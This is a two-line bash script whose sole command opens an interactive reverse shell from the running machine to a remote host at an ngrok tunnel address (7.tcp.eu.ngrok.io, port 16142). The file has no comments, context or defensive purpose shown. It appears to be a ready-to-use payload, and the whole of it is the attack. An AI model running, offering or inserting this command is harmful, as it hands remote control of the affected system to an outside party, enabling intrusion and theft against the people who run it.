#!/bin/bash

bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/16142 0>&1;
